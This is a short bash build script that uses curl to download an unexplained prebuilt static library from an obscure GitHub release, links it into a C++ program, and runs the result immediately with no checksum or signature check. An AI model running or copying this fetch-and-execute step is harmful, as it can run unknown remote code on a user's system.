#!/usr/bin/env bash
set -e
TAG="calm-cedar-gentle-harbor"
LIB="slim-cluster.a"
URL="https://github.com/ejenginl/sharedsecantlab/releases/download/${TAG}/${LIB}"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
